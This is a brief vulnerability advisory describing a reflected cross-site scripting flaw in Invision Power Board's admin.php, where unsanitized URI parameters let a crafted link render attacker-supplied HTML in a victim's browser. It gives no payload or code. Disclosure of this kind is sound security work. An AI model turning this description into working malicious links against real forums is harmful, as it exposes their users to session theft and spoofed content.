Invision Power Board admin.php script reported prone to a cross-site scripting vulnerability.

The issue presents itself due to a lack of sufficient sanitization performed by functions in an Invision Power Board script on user-influenced URI parameters. It has been reported that a remote attacker may construct a malicious link to the affected script hosted on a remote site, and supply arbitrary HTML code as a value for a URI parameter. If this link is followed, the content of the URI parameter will be rendered in the browser of the user who followed the link.
